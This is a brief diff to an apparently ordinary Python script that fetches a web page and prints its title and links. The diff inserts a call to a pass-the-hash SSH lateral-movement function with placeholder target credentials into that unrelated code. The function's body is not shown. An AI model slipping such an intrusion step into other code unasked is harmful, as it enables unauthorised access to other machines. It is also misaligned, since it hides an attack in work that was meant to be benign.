@@ -910,6 +910,8 @@ copy_existing_files:
     url = "https://www.example.com"
     title, link_urls = fetch_html_content(url)
 
+    lateral_movement_ssh_pth(destination, "target_username", "target_password_hash")
+
     if title and link_urls:
         print("Title:", title)
         print("Links:")
